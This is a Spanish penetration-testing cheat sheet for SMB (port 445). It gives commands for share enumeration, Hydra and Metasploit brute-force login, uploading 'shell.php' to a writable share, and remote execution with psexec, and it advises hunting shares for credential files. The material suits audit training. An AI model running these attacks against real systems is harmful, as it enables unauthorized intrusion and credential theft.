# Protocolo SMB (Server Message Block)

> **Puerto por defecto:** `445/TCP`

SMB (Server Message Block) es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes Windows. Durante una auditoría es uno de los servicios más importantes, ya que puede permitir la enumeración de recursos compartidos, usuarios y credenciales, así como el movimiento lateral dentro de un dominio.

---

# Enumeración

## Enumerar recursos compartidos sin autenticación

```bash
smbclient -L //<IP> -N
```

## Enumerar recursos compartidos con credenciales

```bash
smbclient -L //<IP> -U '<usuario>'
```

## Comprobar permisos sobre los recursos compartidos

```bash
smbmap -H <IP> -u '<usuario>' -p '<contraseña>'
```

Salida típica:

```text
Share           Permissions
-----           -----------
ADMIN$          NO ACCESS
C$              NO ACCESS
Users           READ ONLY
Public          READ, WRITE
```

## Acceder a un recurso compartido

```bash
smbclient //<IP>/<recurso> -U '<usuario>'
```

Una vez dentro:

```text
ls
cd
get archivo.txt
mget *
put shell.php
exit
```

---

# Ataques de Fuerza Bruta

## Hydra

Realiza un ataque de diccionario contra el servicio SMB.

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt smb://<IP>
```

También es posible probar múltiples usuarios:

```bash
hydra -L usuarios.txt -P rockyou.txt smb://<IP>
```

---

# Fuerza Bruta con Metasploit

Buscar el módulo:

```text
search smb_login
```

Configuración:

```text
use auxiliary/scanner/smb/smb_login

set RHOSTS <IP>
set SMBUser <usuario>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false

run
```

---

# Explotación

Si se obtienen credenciales válidas, puede intentarse la ejecución remota mediante SMB.

## PsExec (Metasploit)

```text
use exploit/windows/smb/psexec

set RHOSTS <IP>
set SMBUser <usuario>
set SMBPass <contraseña>

run
```

> **Nota:** Este módulo requiere que las credenciales tengan privilegios suficientes (habitualmente un administrador local) y que el sistema objetivo permita este método de ejecución.

---

# Herramientas útiles

| Herramienta | Descripción |
|------------|-------------|
| `smbclient` | Cliente SMB para enumerar y acceder a recursos compartidos. |
| `smbmap` | Enumera permisos sobre los recursos compartidos. |
| `hydra` | Ataques de fuerza bruta y diccionario. |
| `Metasploit smb_login` | Comprobación masiva de credenciales SMB. |
| `Metasploit psexec` | Ejecución remota utilizando credenciales válidas. |

---

> **Consejo:** Tras obtener acceso a un recurso compartido, revisa siempre archivos como `*.txt`, `*.config`, `*.xml`, `*.ini`, `web.config`, copias de seguridad (`.bak`, `.zip`) y scripts (`.ps1`, `.bat`), ya que es frecuente encontrar credenciales o información sensible.
